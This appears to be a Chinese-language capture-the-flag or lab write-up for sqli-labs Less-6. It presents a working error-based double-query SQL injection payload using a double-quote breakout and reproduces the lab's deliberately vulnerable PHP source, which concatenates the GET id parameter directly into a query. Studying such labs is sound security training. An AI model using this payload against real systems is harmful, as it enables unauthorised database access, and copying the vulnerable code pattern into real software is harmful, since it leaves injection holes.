# Less-6 **GET Double Query- Double Quotes- String**
TAG：双查询注入、报错注入、字符型注入、GET型注入
## 漏洞利用
less6和less5同样属于双查询注入，也可以考虑进行盲注  
只需简单的将payload中的单引号替换为双引号即可  
payload:```
?id=1" union select 1,count(*),concat((select user()),floor(rand()*2))as a from information_schema.tables group by a--+```   
![less6_1](images/Less6_1.png)
其余操作与less5相同  

## 源码分析  
### less6源码：
```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-6 Double Query- Double Quotes- String</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 

$id = '"'.$id.'"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
  	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="3"  color= "#FFFF00">';
	print_r(mysql_error());
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
</font> </div></br></br></br><center>
<img src="../images/Less-6.jpg" /></center>
</body>
</html>
```
### 漏洞点分析：
```
$id = '"'.$id.'"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```
此页面的漏洞成因和less5大体相似，只需要注意一下参数id包裹方式的改变并相应的改变恶意语句  
